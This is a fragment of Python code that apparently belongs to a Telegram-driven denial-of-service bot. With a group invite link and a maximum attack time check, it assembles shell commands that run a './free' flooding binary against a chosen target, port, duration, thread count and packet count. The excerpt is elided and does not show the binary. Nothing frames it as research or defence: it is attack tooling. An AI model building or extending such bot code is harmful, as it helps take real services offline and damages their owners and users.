...
GROUP_LINK = "https://t.me/R_SDanger_op"  # Replace with your group invite link
        ...
        try:
            ...
            if time > MAX_ATTACK_TIME:
                ...
                if full_command_type == 1:
                    full_command = f"./free {target} {port} {time}"
                elif full_command_type == 2:
                    full_command = f"./free {target} {port} {time} {threads}"
                elif full_command_type == 3:
                    full_command = f"./free {target} {port} {time} {packets} {threads}"
